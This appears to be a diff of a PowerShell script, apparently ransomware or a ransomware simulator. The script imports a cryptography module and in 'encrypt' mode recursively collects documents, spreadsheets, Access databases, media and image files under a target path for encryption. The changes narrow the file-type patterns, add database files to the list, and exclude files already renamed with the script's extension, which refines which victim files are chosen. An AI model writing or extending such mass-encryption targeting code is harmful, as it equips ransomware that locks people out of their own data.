@@ -43,7 +43,7 @@ param([string]$Mode,
 
 #==== global variables ===================================================================================
 #target file types
-$TargetFiles = '*.pdf*','*.mp3*','*.xls*','*.ppt*','*.doc*','*.mpg*','*.mpeg*','*.rtf*','.txt','.csv','*.jpg*','*.jpeg*','*.png*','*.gif*'
+$TargetFiles = '*.pdf','*.mp3','*.xls*','*.ppt*','*.doc*','*.accd*','*.mpg','*.mpeg','*.rtf','*.txt','*.csv','*.jpg','*.jpeg','*.png','*.gif'
 
 
 #END ==== global variables ===============================================================================
@@ -54,7 +54,7 @@ Import-Module "$PSScriptRoot\FileCryptography.psm1"
 
 if ($mode -eq "encrypt") {
     #find files to encrypt
-    $FilestoEncrypt = get-childitem -path $TargetPath\* -Include $TargetFiles -Recurse -force | where { ! $_.PSIsContainer }
+    $FilestoEncrypt = get-childitem -path $TargetPath\* -Include $TargetFiles -Exclude *$Extension -Recurse -force | where { ! $_.PSIsContainer }
 
     #encrypt each file
 
